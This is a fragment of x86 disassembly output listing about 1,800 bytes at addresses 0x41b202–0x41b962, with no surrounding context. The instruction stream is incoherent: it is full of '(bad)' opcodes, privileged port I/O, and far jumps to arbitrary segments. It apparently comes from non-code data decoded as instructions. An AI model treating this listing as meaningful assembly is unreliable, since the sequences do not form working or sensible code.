  41b202:	jecxz  0x41b1dc
  41b204:	outs   dx,BYTE PTR ds:[esi]
  41b205:	mov    cl,0x1e
  41b207:	push   esp
  41b208:	(bad)
  41b20d:	and    BYTE PTR [esi+ecx*4+0x40960c3b],cl
  41b214:	mov    al,0x0
  41b216:	loope  0x41b1b2
  41b218:	retf   
  41b219:	js     0x41b1d2
  41b21b:	xchg   esp,eax
  41b21c:	or     eax,0xf845f60
  41b221:	fistp  DWORD PTR [edx]
  41b223:	jp     0x41b299
  41b225:	mov    dh,0x5b
  41b227:	pop    ebx
  41b228:	jmp    0x41b1bc
  41b22a:	pop    ds
  41b22b:	ret    0x594e
  41b22e:	inc    DWORD PTR [edi-0x1465eeba]
  41b234:	or     al,0x1b
  41b236:	ds call 0xca6873ab
  41b23c:	mov    al,0xfd
  41b23e:	adc    al,0x58
  41b240:	and    ch,BYTE PTR ds:0x7820a698
  41b247:	sub    al,0xcf
  41b249:	mov    eax,0xb043a761
  41b24e:	add    cl,BYTE PTR [edx+edx*1+0x11]
  41b252:	pusha  
  41b253:	rol    DWORD PTR [edi],1
  41b255:	dec    eax
  41b256:	push   edi
  41b257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b258:	mov    ch,0x4a
  41b25a:	fiadd  WORD PTR [edi-0x28]
  41b25d:	loopne 0x41b2bf
  41b25f:	mov    ebp,0xda4e66e4
  41b264:	clc    
  41b265:	les    ecx,FWORD PTR [ebx+eax*1+0x61079d81]
  41b26c:	(bad)  
  41b26d:	idiv   esp
  41b26f:	pusha  
  41b270:	jmp    0x41b1fb
  41b272:	stos   BYTE PTR es:[edi],al
  41b273:	js     0x41b2d5
  41b275:	ins    DWORD PTR es:[edi],dx
  41b276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b277:	in     eax,0xe2
  41b279:	sbb    al,0xf1
  41b27b:	ja     0x41b2da
  41b27d:	addr16 ffree st(3)
  41b280:	jl     0x41b2a4
  41b282:	dec    edx
  41b283:	sahf   
  41b284:	jmp    0x41b22c
  41b286:	repnz xor BYTE PTR [eax-0x56],ah
  41b28a:	dec    esp
  41b28b:	neg    DWORD PTR [esi-0x5df0a233]
  41b291:	jns    0x41b2f3
  41b293:	inc    esi
  41b294:	das    
  41b295:	pop    eax
  41b296:	jge    0x41b229
  41b298:	and    eax,0xf78306b7
  41b29d:	rcl    DWORD PTR [eax],0x55
  41b2a0:	arpl   WORD PTR [ecx+0x5c],bx
  41b2a3:	xchg   ebp,eax
  41b2a4:	adc    eax,0x50f5bd4f
  41b2a9:	pop    edx
  41b2aa:	sahf   
  41b2ab:	iret   
  41b2ac:	jp     0x41b29a
  41b2ae:	xchg   edi,eax
  41b2af:	sub    eax,esp
  41b2b1:	shl    edi,1
  41b2b3:	jno    0x41b23f
  41b2b5:	or     BYTE PTR [esi+0x792d32],0xeb
  41b2bc:	(bad)  ds:[ebp+0x77]
  41b2c0:	sbb    cl,BYTE PTR [edx]
  41b2c2:	sub    al,0x1e
  41b2c4:	pop    edx
  41b2c5:	aam    0x95
  41b2c7:	or     DWORD PTR [eax+ebp*1],ecx
  41b2ca:	pop    ecx
  41b2cb:	cmp    al,0xe0
  41b2cd:	and    al,0xfb
  41b2cf:	outs   dx,DWORD PTR ds:[esi]
  41b2d0:	mov    edi,0x8b6bd520
  41b2d5:	into   
  41b2d6:	scas   al,BYTE PTR es:[edi]
  41b2d7:	push   0x76
  41b2d9:	test   eax,0x5a1dd387
  41b2de:	bound  ebx,QWORD PTR [ecx-0x54291c6d]
  41b2e4:	nop
  41b2e5:	dec    ebp
  41b2e6:	add    ch,cl
  41b2e8:	mov    BYTE PTR [edi+edx*1-0x50],dh
  41b2ec:	push   eax
  41b2ed:	gs pop es
  41b2ef:	sub    BYTE PTR [edi+0x4],al
  41b2f2:	in     eax,0x3a
  41b2f4:	pop    eax
  41b2f5:	jne    0x41b2f2
  41b2f7:	test   DWORD PTR ds:0x2a06c2af,ecx
  41b2fd:	jmp    0x41b37d
  41b2ff:	out    0x84,eax
  41b301:	mov    ecx,0xeab8574d
  41b306:	jno    0x41b2aa
  41b308:	inc    ecx
  41b309:	retf   
  41b30a:	xchg   edi,eax
  41b30b:	sbb    BYTE PTR [edx],bl
  41b30d:	cmc    
  41b30e:	stc    
  41b30f:	inc    esp
  41b310:	sti    
  41b311:	out    0x85,al
  41b313:	xor    al,0x5f
  41b315:	mov    al,0x8a
  41b317:	sbb    BYTE PTR [esi+0x1b60ca1a],al
  41b31d:	int    0xc9
  41b31f:	(bad)  
  41b320:	fidivr WORD PTR [edi+0x544e41fa]
  41b326:	mov    ch,0x8
  41b328:	jp     0x41b2f4
  41b32a:	stos   DWORD PTR es:[edi],eax
  41b32b:	cmp    edx,0x3c
  41b32e:	dec    ecx
  41b32f:	icebp  
  41b330:	(bad)  
  41b331:	pop    ds
  41b332:	out    0xa3,al
  41b334:	cwde   
  41b335:	xchg   esp,eax
  41b336:	aam    0xa4
  41b338:	shl    BYTE PTR [edi],1
  41b33a:	shl    DWORD PTR [eax],0xc5
  41b33d:	mov    DWORD PTR [ecx],eax
  41b33f:	scas   eax,DWORD PTR es:[edi]
  41b340:	xchg   ebp,eax
  41b341:	leave  
  41b342:	mov    edx,0x87ad7599
  41b347:	stos   BYTE PTR es:[edi],al
  41b348:	les    edx,FWORD PTR [ebx+esi*1]
  41b34b:	fisub  WORD PTR [eax+0x53]
  41b34e:	add    cl,BYTE PTR [edx+0x44]
  41b351:	jo     0x41b2ea
  41b353:	hlt    
  41b354:	sbb    ebx,ebp
  41b356:	add    ebp,edx
  41b358:	popf   
  41b359:	dec    edx
  41b35a:	addr16 dec edx
  41b35c:	mov    al,ds:0xd8741b01
  41b361:	or     eax,edi
  41b363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b364:	iret   
  41b365:	inc    eax
  41b366:	dec    DWORD PTR [edi+0x4be3500b]
  41b36c:	push   ebp
  41b36d:	mov    ds:0xb74f08f7,al
  41b372:	adc    eax,0xa12216f
  41b377:	push   0xd62eb3c1
  41b37c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b37d:	adc    cl,BYTE PTR [bx+di]
  41b380:	add    al,0xa7
  41b382:	cld    
  41b383:	imul   ecx,DWORD PTR [eax],0xffffffa1
  41b386:	cmp    cl,BYTE PTR [edi]
  41b388:	dec    ebp
  41b389:	xchg   esi,eax
  41b38a:	sub    ebp,DWORD PTR [edi+0x661e6adc]
  41b390:	retf   
  41b391:	add    dh,BYTE PTR [esi+0x5a72a742]
  41b397:	mov    edi,esp
  41b399:	sbb    eax,0xfe33cc1e
  41b39e:	xor    BYTE PTR [ecx],ch
  41b3a0:	and    eax,0x3760cf8f
  41b3a5:	cli    
  41b3a6:	pop    ebx
  41b3a7:	mov    fs,WORD PTR [ebx]
  41b3a9:	repz loope 0x41b364
  41b3ac:	xchg   esi,ebp
  41b3ae:	xchg   esi,eax
  41b3af:	mov    edx,0xb18cdf50
  41b3b4:	inc    esp
  41b3b5:	mov    esi,0xee531591
  41b3ba:	mov    DWORD PTR [ebx-0x53],edx
  41b3bd:	call   0xe6a17b38
  41b3c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3c3:	pop    eax
  41b3c4:	pushf  
  41b3c5:	pop    ss
  41b3c6:	and    DWORD PTR [edi-0x12],eax
  41b3c9:	in     eax,0x9d
  41b3cb:	sar    DWORD PTR [edx+0x5bfb921e],cl
  41b3d1:	(bad)  
  41b3d2:	stc    
  41b3d3:	leave  
  41b3d4:	adc    eax,0x179565c3
  41b3d9:	fstp   DWORD PTR ds:0xe38e51f5
  41b3df:	push   ebp
  41b3e0:	shr    DWORD PTR [ecx+0x6],cl
  41b3e3:	adc    ebx,esi
  41b3e5:	xor    dh,BYTE PTR [edi-0x3a377b09]
  41b3eb:	sar    ebp,1
  41b3ed:	jmp    0x41b42d
  41b3ef:	mov    bl,0xe5
  41b3f1:	rol    DWORD PTR [ebp-0x536f6f66],cl
  41b3f7:	js     0x41b3f2
  41b3f9:	add    eax,0x83469bf
  41b3fe:	out    dx,al
  41b3ff:	push   edx
  41b400:	data16 and al,0xfd
  41b403:	pop    ebp
  41b404:	mov    edi,0x1e2145f8
  41b409:	mov    ebx,0x5dfad1d4
  41b40e:	icebp  
  41b40f:	sub    eax,DWORD PTR [edi+edi*8+0x18]
  41b413:	push   0xf61947c5
  41b418:	mov    bh,BYTE PTR [esi]
  41b41a:	retf   
  41b41b:	xchg   edi,eax
  41b41c:	sub    al,bl
  41b41e:	jcxz   0x41b484
  41b421:	ret    0xc33d
  41b424:	inc    esi
  41b425:	iret   
  41b426:	arpl   WORD PTR [edx],bx
  41b428:	push   0xffffffa3
  41b42a:	jne    0x41b3ee
  41b42c:	mov    al,0x47
  41b42e:	loope  0x41b490
  41b430:	sub    eax,0x29559976
  41b435:	dec    esp
  41b436:	cwde   
  41b437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b438:	inc    esi
  41b439:	sar    BYTE PTR [ecx],0xfa
  41b43c:	xchg   edi,eax
  41b43d:	or     eax,0x94c08d27
  41b442:	push   edi
  41b443:	push   ebx
  41b444:	daa    
  41b445:	add    DWORD PTR [eax-0x611293f0],ebx
  41b44b:	dec    edx
  41b44c:	cdq    
  41b44d:	aaa    
  41b44e:	or     al,0x52
  41b450:	jl     0x41b423
  41b452:	enter  0xde20,0xf6
  41b456:	fwait
  41b457:	sbb    ch,bl
  41b459:	xchg   eax,ebp
  41b45b:	dec    ebx
  41b45c:	mov    di,0x4acb
  41b460:	scas   eax,DWORD PTR es:[edi]
  41b461:	mov    eax,ds:0xcb38c9c6
  41b466:	popf   
  41b467:	inc    ebx
  41b468:	push   ebx
  41b469:	sbb    DWORD PTR [ebp+0x2c18f855],esi
  41b46f:	repnz enter 0x699,0xdf
  41b474:	int3   
  41b475:	xor    bx,WORD PTR [esi+edx*8]
  41b479:	xchg   edi,eax
  41b47a:	cmp    DWORD PTR [edx],esp
  41b47c:	ret    0xcb97
  41b47f:	out    dx,al
  41b480:	push   esp
  41b481:	xchg   DWORD PTR ds:0x479fb310,ebx
  41b487:	and    edi,ecx
  41b489:	push   ebx
  41b48a:	jmp    FWORD PTR [ebx+0x42]
  41b48d:	aam    0xe0
  41b48f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b490:	loope  0x41b458
  41b492:	mov    WORD PTR [ecx],ds
  41b494:	mov    edx,0xdd9fd1c7
  41b499:	add    eax,0x4392f1f
  41b49e:	xor    bh,dh
  41b4a0:	daa    
  41b4a1:	mov    bh,0x8d
  41b4a3:	imul   edx,edx,0x7c4de612
  41b4a9:	cwde   
  41b4aa:	jmp    0x41b4be
  41b4ac:	test   BYTE PTR [ebx-0x52],al
  41b4af:	add    eax,0x485c6103
  41b4b4:	ret    0xa476
  41b4b7:	mov    ch,0xb7
  41b4b9:	aad    0xc4
  41b4bb:	add    al,cl
  41b4bd:	out    dx,eax
  41b4be:	jne    0x41b4a1
  41b4c0:	adc    ebx,ebx
  41b4c2:	ds or  eax,0x9d461516
  41b4c8:	in     al,0x89
  41b4ca:	sahf   
  41b4cb:	sub    BYTE PTR [edx-0x18],ch
  41b4ce:	adc    BYTE PTR [esi],dl
  41b4d0:	ins    BYTE PTR es:[edi],dx
  41b4d1:	test   DWORD PTR [eax+ebp*2-0x7e],ecx
  41b4d5:	cmp    esi,ebp
  41b4d7:	push   edx
  41b4d8:	data16 mov bl,0x8d
  41b4db:	dec    ecx
  41b4dc:	add    BYTE PTR [esi],0x3e
  41b4df:	adc    DWORD PTR [edx],0x42
  41b4e2:	mov    edi,0x652b9977
  41b4e7:	(bad)  
  41b4e8:	xor    BYTE PTR [edx+0x70191a2a],bl
  41b4ee:	dec    ecx
  41b4ef:	sar    BYTE PTR [edx+edx*2-0x6b],0x5e
  41b4f4:	sbb    esi,DWORD PTR [ecx]
  41b4f6:	(bad)  
  41b4f8:	cs cld 
  41b4fa:	xchg   ebx,eax
  41b4fb:	scas   al,BYTE PTR es:[edi]
  41b4fc:	(bad)  
  41b4fe:	xor    DWORD PTR [ebp-0xd91667e],eax
  41b504:	sahf   
  41b505:	inc    ebx
  41b506:	rol    DWORD PTR [ebx],0xe1
  41b509:	fcmovne st,st(6)
  41b50b:	adc    edi,DWORD PTR [ebp-0xfd76b94]
  41b511:	test   BYTE PTR [ecx],cl
  41b513:	mov    ebx,0x769f8021
  41b518:	int    0xf2
  41b51a:	ror    DWORD PTR [esi+0x3f2d1416],cl
  41b520:	add    al,0xce
  41b522:	push   esp
  41b523:	std    
  41b524:	pop    edx
  41b525:	xchg   ecx,eax
  41b526:	outs   dx,DWORD PTR ds:[esi]
  41b527:	inc    eax
  41b528:	dec    ebp
  41b529:	test   BYTE PTR [ecx-0x58],bl
  41b52c:	mov    dh,ch
  41b52e:	cmp    BYTE PTR [ecx],al
  41b530:	xlat   BYTE PTR ds:[ebx]
  41b531:	call   0x5a36b62f
  41b536:	push   esi
  41b537:	(bad)  
  41b538:	(bad)  
  41b539:	stos   BYTE PTR es:[edi],al
  41b53a:	js     0x41b596
  41b53c:	mov    ecx,ebp
  41b53e:	jge    0x41b56b
  41b540:	mov    edi,DWORD PTR [edi-0x3e92a2a0]
  41b546:	add    ah,BYTE PTR [ecx]
  41b548:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b549:	xchg   ecx,eax
  41b54a:	cmp    ch,cl
  41b54c:	xchg   ebp,eax
  41b54d:	test   al,0xb1
  41b54f:	pop    edi
  41b550:	cwde   
  41b551:	and    eax,0x2afa724b
  41b556:	xor    ebp,edi
  41b558:	and    BYTE PTR [edi],dh
  41b55a:	push   cs
  41b55b:	call   0x21692337
  41b560:	xchg   ebx,eax
  41b561:	mov    BYTE PTR [ebp+0x5c],dh
  41b564:	leave  
  41b565:	fstp   DWORD PTR [esi]
  41b567:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b568:	xchg   esi,eax
  41b569:	pop    es
  41b56a:	dec    ebp
  41b56b:	or     DWORD PTR [edi+ebp*8-0x38],eax
  41b56f:	or     BYTE PTR [edx],bh
  41b571:	add    bh,BYTE PTR [esi+ecx*2-0x757901c6]
  41b578:	adc    eax,DWORD PTR [esi+0x55]
  41b57b:	sbb    eax,0x10ee8a04
  41b580:	or     esi,DWORD PTR [esi-0x10815e78]
  41b586:	add    ebp,DWORD PTR [eax+0x72c32197]
  41b58c:	std    
  41b58d:	fsubr  st(0),st
  41b58f:	in     al,dx
  41b590:	mov    ebx,0x93953876
  41b595:	push   esp
  41b596:	ret    
  41b597:	pop    ecx
  41b598:	test   al,0x1f
  41b59a:	mov    edi,0xc6daf4fa
  41b5a0:	jecxz  0x41b53b
  41b5a2:	retf   
  41b5a3:	ret    0x5c4a
  41b5a6:	push   ds
  41b5a7:	jp     0x41b5f8
  41b5a9:	(bad)  
  41b5aa:	shl    BYTE PTR [ebp+ebp*2+0x7e],cl
  41b5ae:	push   esi
  41b5af:	cmp    eax,0x5288123f
  41b5b4:	retf   
  41b5b5:	cmp    eax,0x86ff167e
  41b5ba:	into   
  41b5bb:	jecxz  0x41b543
  41b5bd:	je     0x41b58f
  41b5bf:	call   0x3754d733
  41b5c4:	dec    edx
  41b5c5:	mov    eax,0xe711db68
  41b5ca:	sti    
  41b5cb:	pushf  
  41b5cc:	cld    
  41b5cd:	daa    
  41b5ce:	add    eax,0x381ea4bc
  41b5d3:	cmp    BYTE PTR [ebp-0x11],0x1d
  41b5d7:	xchg   ebp,eax
  41b5d8:	inc    ecx
  41b5d9:	fsub   QWORD PTR [esi]
  41b5db:	sub    BYTE PTR [edi+edi*4-0x1c1d3f12],dh
  41b5e2:	(bad)  
  41b5e3:	pop    esi
  41b5e4:	pop    esi
  41b5e5:	jg     0x41b5c1
  41b5e7:	(bad)  
  41b5e8:	mov    bh,0xe3
  41b5ea:	in     eax,dx
  41b5eb:	mov    al,ds:0xcaba81f8
  41b5f0:	or     bh,0xd1
  41b5f3:	setl   BYTE PTR [edi+0x2f]
  41b5f7:	push   edx
  41b5f8:	pop    esi
  41b5f9:	sar    BYTE PTR [esi+0x37955ddc],cl
  41b5ff:	inc    edx
  41b600:	and    DWORD PTR [eax+edx*4+0x57],edi
  41b604:	inc    ebx
  41b605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b606:	repnz mov ds:0x57bf8a13,al
  41b60c:	call   0xf864:0xfa42ec9c
  41b613:	lds    ebp,FWORD PTR [ebp-0x2cc465f1]
  41b619:	sbb    eax,0xc4069fee
  41b61e:	les    ecx,FWORD PTR [ecx+0x5f1794bb]
  41b624:	sti    
  41b625:	test   BYTE PTR [ebx-0x4],bl
  41b628:	ss jecxz 0x41b616
  41b62b:	mov    ch,0x83
  41b62d:	and    BYTE PTR [ebx],dl
  41b62f:	std    
  41b630:	retf   0x6970
  41b633:	xchg   ebx,eax
  41b634:	cmp    BYTE PTR [eax+eax*1-0x40],dh
  41b638:	xor    DWORD PTR [eax+0x59],edi
  41b63b:	lods   al,BYTE PTR ds:[esi]
  41b63c:	test   eax,0x8b7a89b1
  41b641:	fnsave [ebp-0x35b1f906]
  41b647:	pop    ebp
  41b648:	aas    
  41b649:	jnp    0x41b5ef
  41b64b:	outs   dx,DWORD PTR ds:[esi]
  41b64c:	nop
  41b64d:	stos   DWORD PTR es:[edi],eax
  41b64e:	dec    ebx
  41b64f:	clc    
  41b650:	inc    ecx
  41b651:	aad    0xfd
  41b653:	js     0x41b6aa
  41b655:	mov    edx,DWORD PTR [edi+edi*2]
  41b658:	or     ebx,ebp
  41b65a:	jmp    0xde84:0x1b0e2c29
  41b661:	sub    BYTE PTR [ecx+0x7e],0xca
  41b665:	fwait
  41b666:	inc    edx
  41b667:	test   DWORD PTR [ebp+0x30],0xe77da3d8
  41b66e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b66f:	jmp    0xd17390a8
  41b674:	lds    ecx,FWORD PTR ss:[ebx]
  41b677:	pop    edi
  41b678:	mov    eax,ds:0x1e9d25a
  41b67d:	ins    DWORD PTR es:[edi],dx
  41b67e:	mov    eax,ds:0xfa0f0562
  41b683:	arpl   WORD PTR [eax-0x483eae03],ax
  41b689:	adc    DWORD PTR [eax-0x7d87e0ce],ebp
  41b68f:	sub    eax,0xcb04dbaf
  41b694:	std    
  41b695:	adc    al,0x37
  41b697:	add    esi,edx
  41b699:	arpl   WORD PTR [esi-0x3a],sp
  41b69c:	into   
  41b69d:	cmp    eax,DWORD PTR [eax-0x48]
  41b6a0:	xchg   ebp,eax
  41b6a1:	das    
  41b6a2:	mov    ds:0xf372d464,eax
  41b6a7:	sub    al,0x46
  41b6a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6aa:	xor    dl,BYTE PTR [ebx-0x63]
  41b6ad:	and    eax,0xb8a6cc04
  41b6b2:	or     al,0xe9
  41b6b4:	test   al,0xb6
  41b6b6:	mov    bl,dh
  41b6b8:	std    
  41b6b9:	leave  
  41b6ba:	scas   al,BYTE PTR es:[edi]
  41b6bb:	mov    edi,0x6f4ef85d
  41b6c0:	retf   0xa35b
  41b6c3:	ret    0x72a1
  41b6c6:	jg     0x41b6cf
  41b6c8:	in     al,dx
  41b6c9:	xlat   BYTE PTR ds:[ebx]
  41b6ca:	push   es
  41b6cb:	cli    
  41b6cc:	(bad)  
  41b6cd:	int3   
  41b6ce:	cmp    eax,0xf58fdd42
  41b6d3:	loopne 0x41b739
  41b6d5:	mov    BYTE PTR [ebx],dh
  41b6d7:	ret    
  41b6d8:	fist   WORD PTR [ebx+0x1de43313]
  41b6de:	sbb    BYTE PTR [edx-0xd],ch
  41b6e1:	loope  0x41b74a
  41b6e3:	sub    bl,ch
  41b6e5:	(bad)  
  41b6e6:	rcr    DWORD PTR [ecx-0x41],1
  41b6e9:	pop    es
  41b6ea:	and    ecx,edx
  41b6ec:	mov    al,ds:0xb5074881
  41b6f1:	mov    edx,0xc3ebe6d9
  41b6f6:	cmp    BYTE PTR [esi],dh
  41b6f8:	inc    eax
  41b6f9:	loopne 0x41b6e0
  41b6fb:	dec    esp
  41b6fc:	ss mov ch,0xbf
  41b6ff:	(bad)  
  41b700:	loop   0x41b775
  41b702:	lods   al,BYTE PTR ds:[esi]
  41b703:	cmp    al,0xea
  41b705:	pop    es
  41b706:	pop    ds
  41b707:	ins    DWORD PTR es:[edi],dx
  41b708:	retf   0xb009
  41b70b:	aam    0x6d
  41b70d:	mov    eax,ds:0xb520e9da
  41b712:	jo     0x41b6d7
  41b714:	xchg   edx,eax
  41b715:	lea    edi,[eax+0x21]
  41b718:	pop    esi
  41b719:	jmp    0x9714:0x5d9dae61
  41b720:	fadd   st(1),st
  41b722:	cmp    ch,BYTE PTR [edi-0x469bfe30]
  41b728:	sub    DWORD PTR [edi+0x37],esp
  41b72b:	call   0x78d539d8
  41b730:	push   eax
  41b731:	ja     0x41b74d
  41b733:	xchg   edi,eax
  41b734:	enter  0x2003,0x4
  41b738:	inc    ebp
  41b739:	nop
  41b73a:	jge    0x41b77f
  41b73c:	mov    ah,0x45
  41b73e:	aaa    
  41b73f:	hlt    
  41b740:	or     DWORD PTR [eax],esp
  41b742:	or     DWORD PTR [edi],ecx
  41b744:	jmp    0xf8e6:0x4278f172
  41b74b:	xchg   esi,eax
  41b74c:	and    ecx,DWORD PTR [ecx]
  41b74e:	push   esi
  41b74f:	push   edi
  41b750:	sub    eax,0xa5fb8a4f
  41b755:	mov    ds:0x8dce7d34,eax
  41b75a:	jae    0x41b75c
  41b75c:	fcom   QWORD PTR [esi]
  41b75e:	pusha  
  41b75f:	fst    QWORD PTR ds:0x18e452e7
  41b765:	ins    BYTE PTR es:[edi],dx
  41b766:	dec    esi
  41b767:	jmp    0x1274:0x268efbfa
  41b76e:	imul   esp,esi,0xffffffb3
  41b771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b772:	add    al,0x44
  41b774:	popa   
  41b775:	loopne 0x41b740
  41b777:	sub    BYTE PTR [ebx+0x3bc3c605],0x5d
  41b77e:	sahf   
  41b77f:	test   DWORD PTR [ecx+0x76],esp
  41b782:	or     al,0xd9
  41b784:	sbb    ebp,esp
  41b786:	mov    edi,0x58f12e36
  41b78b:	xchg   BYTE PTR [edi],cl
  41b78d:	out    0x64,al
  41b78f:	add    BYTE PTR [eax+0x9acc88f],al
  41b795:	sahf   
  41b796:	repnz out dx,al
  41b798:	adc    BYTE PTR [edi+0x3f495ac5],cl
  41b79e:	fnstenv [edi]
  41b7a0:	lea    esi,[ebp+0x4c392b92]
  41b7a6:	cmp    BYTE PTR [ebx+0x3db8194a],0x8a
  41b7ad:	push   eax
  41b7ae:	out    dx,al
  41b7af:	test   al,0x87
  41b7b1:	jl     0x41b7eb
  41b7b3:	in     al,0x98
  41b7b5:	jne    0x41b784
  41b7b7:	cdq    
  41b7b8:	or     al,0x1a
  41b7ba:	adc    dl,ch
  41b7bc:	fs xchg ebp,eax
  41b7be:	out    dx,al
  41b7bf:	add    DWORD PTR [ebx-0x37],eax
  41b7c2:	or     esp,DWORD PTR [edi+0x7002a381]
  41b7c8:	cwde   
  41b7c9:	lds    esi,FWORD PTR [ebp+0xf65171a]
  41b7cf:	xlat   BYTE PTR ds:[ebx]
  41b7d0:	lods   al,BYTE PTR ds:[esi]
  41b7d1:	mov    esp,0x25e18454
  41b7d6:	sub    dh,BYTE PTR [edx-0x5e]
  41b7d9:	std    
  41b7da:	mov    bh,ah
  41b7dc:	outs   dx,DWORD PTR ds:[esi]
  41b7dd:	imul   ebp,DWORD PTR [edi],0xfc140edd
  41b7e3:	addr16 xor eax,0x14930712
  41b7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7ea:	or     BYTE PTR [ebx+0x2],ah
  41b7ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7ee:	cmc    
  41b7ef:	sti    
  41b7f0:	mov    edx,0x5f4f6643
  41b7f5:	ret    
  41b7f6:	sub    DWORD PTR [ecx-0x17e79a1b],esp
  41b7fc:	jns    0x41b7fc
  41b7fe:	or     ch,al
  41b800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b801:	jecxz  0x41b789
  41b803:	pop    ecx
  41b804:	fs jecxz 0x41b830
  41b807:	add    al,0x9b
  41b809:	or     ah,ah
  41b80b:	xchg   BYTE PTR [ecx-0x49],al
  41b80e:	or     bl,dh
  41b810:	ds pop esp
  41b812:	es sbb cl,ch
  41b815:	pop    edx
  41b816:	mov    al,ch
  41b818:	cwde   
  41b819:	jae    0x41b7e7
  41b81b:	or     edx,ebx
  41b81d:	loope  0x41b7d9
  41b81f:	(bad)  
  41b820:	push   ecx
  41b821:	mov    WORD PTR [ebx+0x2e],cs
  41b824:	push   eax
  41b825:	jmp    0x6be47f10
  41b82a:	jo     0x41b868
  41b82c:	mov    ah,0x98
  41b82e:	and    eax,0x25e14564
  41b833:	mov    bh,0x17
  41b835:	js     0x41b81e
  41b837:	enter  0x19cb,0xb6
  41b83b:	add    DWORD PTR [ecx-0x434c37d7],esi
  41b841:	rcl    DWORD PTR [edi-0x37],0x1c
  41b845:	jge    0x41b86b
  41b847:	ror    esi,0x72
  41b84a:	popa   
  41b84b:	outs   dx,BYTE PTR ds:[esi]
  41b84c:	pop    es
  41b84d:	push   edi
  41b84e:	loopne 0x41b84f
  41b850:	ret    
  41b851:	fsubr  QWORD PTR [ebx-0x1208c128]
  41b857:	out    0xd5,al
  41b859:	inc    ecx
  41b85a:	out    0xa5,al
  41b85c:	cwde   
  41b85d:	fcom   DWORD PTR [ebx+0x4f]
  41b860:	inc    ebp
  41b861:	xor    eax,0x5b515344
  41b866:	bound  ebp,QWORD PTR [eax+0x3f9716c8]
  41b86c:	inc    esp
  41b86e:	popa   
  41b86f:	rep stos DWORD PTR es:[edi],eax
  41b871:	mov    dl,0x5a
  41b873:	pushf  
  41b874:	jl     0x41b801
  41b876:	xor    BYTE PTR [esi],dl
  41b878:	jl     0x41b7fd
  41b87a:	mov    ebp,DWORD PTR [edi+esi*2]
  41b87d:	gs cmp eax,0x14edb770
  41b883:	xchg   edx,eax
  41b884:	inc    ebp
  41b885:	mov    edi,0xae888141
  41b88a:	cdq    
  41b88b:	arpl   WORD PTR ds:0x723fb9c1,sp
  41b891:	push   cs
  41b892:	adc    BYTE PTR [eax],bh
  41b894:	or     al,0xa9
  41b896:	mov    eax,0x9fef947b
  41b89b:	pusha  
  41b89c:	dec    ecx
  41b89d:	sub    eax,0x2e1ed56e
  41b8a2:	pop    esp
  41b8a3:	cmp    eax,DWORD PTR ds:0x54fecc36
  41b8a9:	add    dl,ah
  41b8ab:	rcl    esp,0x53
  41b8ae:	push   0xc
  41b8b0:	(bad)  
  41b8b1:	cmp    BYTE PTR [edx+0x1b],dl
  41b8b4:	adc    al,0xa6
  41b8b6:	or     ebp,eax
  41b8b8:	int    0x34
  41b8ba:	scas   eax,DWORD PTR es:[edi]
  41b8bb:	sub    eax,0x9e1c544c
  41b8c0:	dec    ecx
  41b8c1:	into   
  41b8c2:	stc    
  41b8c3:	test   eax,0xffc3f0bb
  41b8c8:	and    eax,0x3882e640
  41b8cd:	(bad)  
  41b8ce:	pop    ds
  41b8cf:	in     al,0xaf
  41b8d1:	sbb    BYTE PTR [esi+0x702db8fd],0x30
  41b8d8:	loope  0x41b8b7
  41b8da:	jmp    FWORD PTR ds:0x9631231c
  41b8e0:	push   ecx
  41b8e1:	outs   dx,DWORD PTR ds:[esi]
  41b8e2:	xchg   ebp,esp
  41b8e4:	pop    ecx
  41b8e5:	adc    ch,dh
  41b8e7:	xor    DWORD PTR [eax],ecx
  41b8e9:	lods   al,BYTE PTR ds:[esi]
  41b8ea:	pusha  
  41b8eb:	sbb    DWORD PTR [ebp-0x50],esi
  41b8ee:	nop
  41b8ef:	outs   dx,DWORD PTR ds:[esi]
  41b8f0:	add    bl,BYTE PTR [esi]
  41b8f2:	lock into 
  41b8f4:	aam    0x74
  41b8f6:	cmp    DWORD PTR [ebx-0x1b],0x8eb6d0f5
  41b8fd:	jge    0x41b92f
  41b8ff:	cmp    BYTE PTR [esi],dl
  41b901:	cdq    
  41b902:	pusha  
  41b903:	push   es
  41b904:	push   esi
  41b905:	aas    
  41b906:	cmp    al,0xeb
  41b908:	pop    es
  41b909:	xchg   ecx,eax
  41b90a:	or     ebx,DWORD PTR [esi+0x467459a8]
  41b910:	lods   al,BYTE PTR ds:[esi]
  41b911:	xchg   ebx,eax
  41b912:	add    al,0x49
  41b914:	(bad)  
  41b916:	test   BYTE PTR [ecx+0x3],al
  41b919:	xchg   ecx,eax
  41b91a:	adc    bl,BYTE PTR [ebp+0x4b]
  41b91d:	nop
  41b91e:	sbb    BYTE PTR [ebp+ecx*1+0x24ed787a],0x65
  41b926:	mov    al,ds:0x8f8ba28
  41b92b:	mov    edx,0x18ac9615
  41b930:	sub    BYTE PTR [esi],0x6d
  41b933:	adc    BYTE PTR [edx+0x2208abc6],0xb2
  41b93a:	stos   BYTE PTR es:[edi],al
  41b93b:	mov    ch,0x1f
  41b93d:	or     al,BYTE PTR ds:[esi+0x31cae64b]
  41b944:	push   eax
  41b945:	xor    BYTE PTR [esi+eax*1-0x33],ch
  41b949:	jecxz  0x41b921
  41b94b:	(bad)  
  41b94c:	shl    DWORD PTR [bp+si+0x3be0],1
  41b951:	js     0x41b95f
  41b953:	fstp   QWORD PTR [edx+0x1f71894f]
  41b959:	retf   0x55a9
  41b95c:	mov    dh,0x41
  41b95e:	xor    dh,BYTE PTR [ebp-0x79]
  41b961:	push   ebp
  41b962:	pop    ebp
